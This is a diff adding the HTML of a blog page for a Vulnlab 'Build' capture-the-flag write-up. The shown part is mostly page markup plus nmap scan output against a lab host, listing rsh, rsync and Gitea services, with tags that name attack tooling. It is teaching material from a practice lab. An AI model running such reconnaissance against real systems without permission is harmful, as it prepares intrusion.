@@ -1,0 +1,1132 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="\nEnumeration Nmap scan I start with a standard scan using nmap\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 exegol-VulnLab /workspace # nmap -sCV --min-rate 5000 -p- 10.10.104.46 Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-31 19:53 CET Nmap scan report for 10.10.104.46 Host is up (0.033s latency). Not shown: 65526 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 472173e26b96cdf91311af40c84dd67f (ECDSA) |_ 256 2b5ebaf372d3b309df25412909f47bf5 (ED25519) 53/tcp open domain PowerDNS | dns-nsid: | NSID: pdns (70646e73) |_ id.server: pdns 512/tcp open exec netkit-rsh rexecd 513/tcp open login? 514/tcp open shell Netkit rshd 873/tcp open rsync (protocol version 31) 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Cache-Control: max-age=0, private, must-revalidate, no-transform | Content-Type: text/html; charset=utf-8 | Set-Cookie: i_like_gitea=d2c9c1889c1be19e; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=wDA7qaMkEld7Qac9d679W84mZGc6MTczNTY3MTE5ODcxNDk2MjUwOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Tue, 31 Dec 2024 18:53:18 GMT | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en-US&#34; class=&#34;theme-auto&#34;&gt; | &lt;head&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt; | &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt; | &lt;link rel=&#34;manifest&#34; href=&#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Allow: HEAD | Allow: GET | Cache-Control: max-age=0, private, must-revalidate, no-transform | Set-Cookie: i_like_gitea=3f4d6c58c593d79c; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=ctOOokawoDQpWUCFgg2IYwPMi4s6MTczNTY3MTIwMzkwNTcxMjYzNw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Tue, 31 Dec 2024 18:53:23 GMT |_ Content-Length: 0 3306/tcp filtered mysql 8081/tcp filtered blackice-icecap 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3000-TCP:V=7.93%I=7%D=12/31%Time=67743D9F%P=x86_64-pc-linux-gnu%r(G SF:enericLines,67,&#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\ SF:x20Request&#34;)%r(GetRequest,2990,&#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nCache-Control SF::\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nCont SF:ent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nSet-Cookie:\\x20i_like_gitea SF:=d2c9c1889c1be19e;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nSet-Cooki SF:e:\\x20_csrf=wDA7qaMkEld7Qac9d679W84mZGc6MTczNTY3MTE5ODcxNDk2MjUwOQ;\\x20 SF:Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-Frame-Optio SF:ns:\\x20SAMEORIGIN\\r\\nDate:\\x20Tue,\\x2031\\x20Dec\\x202024\\x2018:53:18\\x20 SF:GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\&#34;en-US\\&#34;\\x20class=\\&#34;theme SF:-auto\\&#34;&gt;\\n&lt;head&gt;\\n\\t&lt;meta\\x20name=\\&#34;viewport\\&#34;\\x20content=\\&#34;width=devic SF:e-width,\\x20initial-scale=1\\&#34;&gt;\\n\\t&lt;title&gt;Gitea:\\x20Git\\x20with\\x20a\\x20 SF:cup\\x20of\\x20tea&lt;/title&gt;\\n\\t&lt;link\\x20rel=\\&#34;manifest\\&#34;\\x20href=\\&#34;data:ap SF:plication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlY SF:SIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRf SF:dXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9 SF:idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIi SF:wic2l6ZXMiOiI1MTJ&#34;)%r(Help,67,&#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nCo SF:ntent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n SF:\\r\\n400\\x20Bad\\x20Request&#34;)%r(HTTPOptions,197,&#34;HTTP/1\\.0\\x20405\\x20Meth SF:od\\x20Not\\x20Allowed\\r\\nAllow:\\x20HEAD\\r\\nAllow:\\x20GET\\r\\nCache-Contro SF:l:\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nSet SF:-Cookie:\\x20i_like_gitea=3f4d6c58c593d79c;\\x20Path=/;\\x20HttpOnly;\\x20S SF:ameSite=Lax\\r\\nSet-Cookie:\\x20_csrf=ctOOokawoDQpWUCFgg2IYwPMi4s6MTczNTY SF:3MTIwMzkwNTcxMjYzNw;\\x20Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameS SF:ite=Lax\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Tue,\\x2031\\x20Dec SF:\\x202024\\x2018:53:23\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n&#34;)%r(RTSPReq SF:uest,67,&#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/pl SF:ain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Requ HTTP - 3000 On port 3000, there is Gitea, which contains 1 public repository\n">
+<title>Vulnlab :: Build Writeup</title>
+
+<link rel='canonical' href='http://localhost:1313/p/vulnlab-build-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Vulnlab :: Build Writeup">
+<meta property='og:description' content="\nEnumeration Nmap scan I start with a standard scan using nmap\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 exegol-VulnLab /workspace # nmap -sCV --min-rate 5000 -p- 10.10.104.46 Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-31 19:53 CET Nmap scan report for 10.10.104.46 Host is up (0.033s latency). Not shown: 65526 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 472173e26b96cdf91311af40c84dd67f (ECDSA) |_ 256 2b5ebaf372d3b309df25412909f47bf5 (ED25519) 53/tcp open domain PowerDNS | dns-nsid: | NSID: pdns (70646e73) |_ id.server: pdns 512/tcp open exec netkit-rsh rexecd 513/tcp open login? 514/tcp open shell Netkit rshd 873/tcp open rsync (protocol version 31) 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Cache-Control: max-age=0, private, must-revalidate, no-transform | Content-Type: text/html; charset=utf-8 | Set-Cookie: i_like_gitea=d2c9c1889c1be19e; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=wDA7qaMkEld7Qac9d679W84mZGc6MTczNTY3MTE5ODcxNDk2MjUwOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Tue, 31 Dec 2024 18:53:18 GMT | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en-US&#34; class=&#34;theme-auto&#34;&gt; | &lt;head&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt; | &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt; | &lt;link rel=&#34;manifest&#34; href=&#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Allow: HEAD | Allow: GET | Cache-Control: max-age=0, private, must-revalidate, no-transform | Set-Cookie: i_like_gitea=3f4d6c58c593d79c; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=ctOOokawoDQpWUCFgg2IYwPMi4s6MTczNTY3MTIwMzkwNTcxMjYzNw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Tue, 31 Dec 2024 18:53:23 GMT |_ Content-Length: 0 3306/tcp filtered mysql 8081/tcp filtered blackice-icecap 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3000-TCP:V=7.93%I=7%D=12/31%Time=67743D9F%P=x86_64-pc-linux-gnu%r(G SF:enericLines,67,&#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\ SF:x20Request&#34;)%r(GetRequest,2990,&#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nCache-Control SF::\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nCont SF:ent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nSet-Cookie:\\x20i_like_gitea SF:=d2c9c1889c1be19e;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nSet-Cooki SF:e:\\x20_csrf=wDA7qaMkEld7Qac9d679W84mZGc6MTczNTY3MTE5ODcxNDk2MjUwOQ;\\x20 SF:Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-Frame-Optio SF:ns:\\x20SAMEORIGIN\\r\\nDate:\\x20Tue,\\x2031\\x20Dec\\x202024\\x2018:53:18\\x20 SF:GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\&#34;en-US\\&#34;\\x20class=\\&#34;theme SF:-auto\\&#34;&gt;\\n&lt;head&gt;\\n\\t&lt;meta\\x20name=\\&#34;viewport\\&#34;\\x20content=\\&#34;width=devic SF:e-width,\\x20initial-scale=1\\&#34;&gt;\\n\\t&lt;title&gt;Gitea:\\x20Git\\x20with\\x20a\\x20 SF:cup\\x20of\\x20tea&lt;/title&gt;\\n\\t&lt;link\\x20rel=\\&#34;manifest\\&#34;\\x20href=\\&#34;data:ap SF:plication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlY SF:SIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRf SF:dXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9 SF:idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIi SF:wic2l6ZXMiOiI1MTJ&#34;)%r(Help,67,&#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nCo SF:ntent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n SF:\\r\\n400\\x20Bad\\x20Request&#34;)%r(HTTPOptions,197,&#34;HTTP/1\\.0\\x20405\\x20Meth SF:od\\x20Not\\x20Allowed\\r\\nAllow:\\x20HEAD\\r\\nAllow:\\x20GET\\r\\nCache-Contro SF:l:\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nSet SF:-Cookie:\\x20i_like_gitea=3f4d6c58c593d79c;\\x20Path=/;\\x20HttpOnly;\\x20S SF:ameSite=Lax\\r\\nSet-Cookie:\\x20_csrf=ctOOokawoDQpWUCFgg2IYwPMi4s6MTczNTY SF:3MTIwMzkwNTcxMjYzNw;\\x20Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameS SF:ite=Lax\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Tue,\\x2031\\x20Dec SF:\\x202024\\x2018:53:23\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n&#34;)%r(RTSPReq SF:uest,67,&#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/pl SF:ain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Requ HTTP - 3000 On port 3000, there is Gitea, which contains 1 public repository\n">
+<meta property='og:url' content='http://localhost:1313/p/vulnlab-build-writeup/'>
+<meta property='og:site_name' content='qrxnz&#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='jenkins' /><meta property='article:tag' content='gitea' /><meta property='article:tag' content='exegol' /><meta property='article:tag' content='sliver' /><meta property='article:tag' content='proxychains' /><meta property='article:tag' content='nmap' /><meta property='article:tag' content='linux' /><meta property='article:tag' content='ctf' /><meta property='article:tag' content='hashcat' /><meta property='article:tag' content='socks5' /><meta property='article:tag' content='misconfigurations' /><meta property='article:tag' content='rsync' /><meta property='article:tag' content='Mariadb' /><meta property='article:tag' content='powerdns' /><meta property='article:published_time' content='2025-01-04T19:54:32&#43;01:00'/><meta property='article:modified_time' content='2025-01-04T19:54:32&#43;01:00'/>
+<meta name="twitter:title" content="Vulnlab :: Build Writeup">
+<meta name="twitter:description" content="\nEnumeration Nmap scan I start with a standard scan using nmap\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 exegol-VulnLab /workspace # nmap -sCV --min-rate 5000 -p- 10.10.104.46 Starting Nmap 7.93 ( https://nmap.org ) at 2024-12-31 19:53 CET Nmap scan report for 10.10.104.46 Host is up (0.033s latency). Not shown: 65526 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 472173e26b96cdf91311af40c84dd67f (ECDSA) |_ 256 2b5ebaf372d3b309df25412909f47bf5 (ED25519) 53/tcp open domain PowerDNS | dns-nsid: | NSID: pdns (70646e73) |_ id.server: pdns 512/tcp open exec netkit-rsh rexecd 513/tcp open login? 514/tcp open shell Netkit rshd 873/tcp open rsync (protocol version 31) 3000/tcp open ppp? | fingerprint-strings: | GenericLines, Help, RTSPRequest: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Cache-Control: max-age=0, private, must-revalidate, no-transform | Content-Type: text/html; charset=utf-8 | Set-Cookie: i_like_gitea=d2c9c1889c1be19e; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=wDA7qaMkEld7Qac9d679W84mZGc6MTczNTY3MTE5ODcxNDk2MjUwOQ; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Tue, 31 Dec 2024 18:53:18 GMT | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en-US&#34; class=&#34;theme-auto&#34;&gt; | &lt;head&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt; | &lt;title&gt;Gitea: Git with a cup of tea&lt;/title&gt; | &lt;link rel=&#34;manifest&#34; href=&#34;data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ | HTTPOptions: | HTTP/1.0 405 Method Not Allowed | Allow: HEAD | Allow: GET | Cache-Control: max-age=0, private, must-revalidate, no-transform | Set-Cookie: i_like_gitea=3f4d6c58c593d79c; Path=/; HttpOnly; SameSite=Lax | Set-Cookie: _csrf=ctOOokawoDQpWUCFgg2IYwPMi4s6MTczNTY3MTIwMzkwNTcxMjYzNw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax | X-Frame-Options: SAMEORIGIN | Date: Tue, 31 Dec 2024 18:53:23 GMT |_ Content-Length: 0 3306/tcp filtered mysql 8081/tcp filtered blackice-icecap 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port3000-TCP:V=7.93%I=7%D=12/31%Time=67743D9F%P=x86_64-pc-linux-gnu%r(G SF:enericLines,67,&#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20 SF:text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\ SF:x20Request&#34;)%r(GetRequest,2990,&#34;HTTP/1\\.0\\x20200\\x20OK\\r\\nCache-Control SF::\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nCont SF:ent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nSet-Cookie:\\x20i_like_gitea SF:=d2c9c1889c1be19e;\\x20Path=/;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nSet-Cooki SF:e:\\x20_csrf=wDA7qaMkEld7Qac9d679W84mZGc6MTczNTY3MTE5ODcxNDk2MjUwOQ;\\x20 SF:Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameSite=Lax\\r\\nX-Frame-Optio SF:ns:\\x20SAMEORIGIN\\r\\nDate:\\x20Tue,\\x2031\\x20Dec\\x202024\\x2018:53:18\\x20 SF:GMT\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\&#34;en-US\\&#34;\\x20class=\\&#34;theme SF:-auto\\&#34;&gt;\\n&lt;head&gt;\\n\\t&lt;meta\\x20name=\\&#34;viewport\\&#34;\\x20content=\\&#34;width=devic SF:e-width,\\x20initial-scale=1\\&#34;&gt;\\n\\t&lt;title&gt;Gitea:\\x20Git\\x20with\\x20a\\x20 SF:cup\\x20of\\x20tea&lt;/title&gt;\\n\\t&lt;link\\x20rel=\\&#34;manifest\\&#34;\\x20href=\\&#34;data:ap SF:plication/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlY SF:SIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRf SF:dXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9 SF:idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIi SF:wic2l6ZXMiOiI1MTJ&#34;)%r(Help,67,&#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nCo SF:ntent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n SF:\\r\\n400\\x20Bad\\x20Request&#34;)%r(HTTPOptions,197,&#34;HTTP/1\\.0\\x20405\\x20Meth SF:od\\x20Not\\x20Allowed\\r\\nAllow:\\x20HEAD\\r\\nAllow:\\x20GET\\r\\nCache-Contro SF:l:\\x20max-age=0,\\x20private,\\x20must-revalidate,\\x20no-transform\\r\\nSet SF:-Cookie:\\x20i_like_gitea=3f4d6c58c593d79c;\\x20Path=/;\\x20HttpOnly;\\x20S SF:ameSite=Lax\\r\\nSet-Cookie:\\x20_csrf=ctOOokawoDQpWUCFgg2IYwPMi4s6MTczNTY SF:3MTIwMzkwNTcxMjYzNw;\\x20Path=/;\\x20Max-Age=86400;\\x20HttpOnly;\\x20SameS SF:ite=Lax\\r\\nX-Frame-Options:\\x20SAMEORIGIN\\r\\nDate:\\x20Tue,\\x2031\\x20Dec SF:\\x202024\\x2018:53:23\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n&#34;)%r(RTSPReq SF:uest,67,&#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/pl SF:ain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Requ HTTP - 3000 On port 3000, there is Gitea, which contains 1 public repository\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu11101733084245688547.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">😺</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">qrxnz&#39;s blog</a></h1>
+            <h2 class="site-description">~ Dear diary, dear diary I&#39;ve been searching for a higher me</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/qrxnz'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-github"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.linkedin.com/in/karol-skoczyk17'
+                        target="_blank"
+                        title="Linkedin"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-linkedin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 11v5" /><path d="M8 8v.01" /><path d="M12 16v-5" /><path d="M16 16v-3a2 2 0 1 0 -4 0" /><path d="M3 7a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v10a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4z" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://linktr.ee/qrxnz'
+                        target="_blank"
+                        title="Linktree"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-linktree"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 10h16" /><path d="M6.5 4.5l11 11" /><path d="M6.5 15.5l11 -11" /><path d="M12 10v-8" /><path d="M12 15v7" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://mastodon.social/@qrxnz'
+                        target="_blank"
+                        title="Mastodon"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-mastodon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18.648 15.254c-1.816 1.763 -6.648 1.626 -6.648 1.626a18.262 18.262 0 0 1 -3.288 -.256c1.127 1.985 4.12 2.81 8.982 2.475c-1.945 2.013 -13.598 5.257 -13.668 -7.636l-.026 -1.154c0 -3.036 .023 -4.115 1.352 -5.633c1.671 -1.91 6.648 -1.666 6.648 -1.666s4.977 -.243 6.648 1.667c1.329 1.518 1.352 2.597 1.352 5.633s-.456 4.074 -1.352 4.944z" /><path d="M12 11.204v-2.926c0 -1.258 -.895 -2.278 -2 -2.278s-2 1.02 -2 2.278v4.722m4 -4.722c0 -1.258 .895 -2.278 2 -2.278s2 1.02 2 2.278v4.722" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.youtube.com/@qrxnz9209/'
+                        target="_blank"
+                        title="Youtube"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-youtube"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M2 8a4 4 0 0 1 4 -4h12a4 4 0 0 1 4 4v8a4 4 0 0 1 -4 4h-12a4 4 0 0 1 -4 -4v-8z" /><path d="M10 9l5 3l-5 3z" /></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
